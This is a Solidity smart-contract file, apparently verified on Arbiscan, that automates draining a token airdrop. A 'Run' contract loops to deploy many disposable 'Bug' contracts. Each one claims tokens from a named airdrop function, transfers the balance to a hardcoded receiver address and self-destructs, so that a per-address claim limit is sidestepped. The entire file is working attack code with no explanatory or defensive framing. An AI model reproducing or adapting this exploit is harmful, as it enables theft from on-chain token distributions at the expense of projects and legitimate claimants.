/**
 *Submitted for verification at Arbiscan on 2023-04-20
*/

pragma solidity ^0.8.0;


interface IERC20 {
function transfer(address to, uint256 amount) external returns (bool);
function balanceOf(address account) external view returns (uint256);
}

interface shibDis2 {
    function claimTokensForARB() external;
}

contract Bug {
    // IERC20 shibai = IERC20(address(0xFA296FcA3c7DBa4a92A42Ec0B5E2138DA3b29050)); // real
    // IERC20 shibai = IERC20(address(0x3feA85321C6465E22C9809ce967a96380DC48242));
    
    // 0x3feA85321C6465E22C9809ce967a96380DC48242
    function cliam(address airdrop, address _shibai, address receiver) public {
        shibDis2 shibDis2Contract = shibDis2(airdrop);
        shibDis2Contract.claimTokensForARB();
        IERC20 shibai = IERC20(_shibai); // link
        uint256 balance = shibai.balanceOf(address(this));
        if (balance > 0) {
            shibai.transfer(receiver, balance);
        }
        selfdestruct(payable(address(receiver)));
    }

}


contract Run{
    address immutable receiver  = address(0x3924105EB1Da270909De27F6f10bCa85B0cbf7f2);

    // constructor(address shit) {
        // shibai = shit;
    // }

    function beRich(uint256 count, address air, address shibai) public {
        Bug bug;
        for (uint256 i=0; i < count; i ++) {
            bug = new Bug();
            bug.cliam(air, shibai, receiver);
        }
    }
}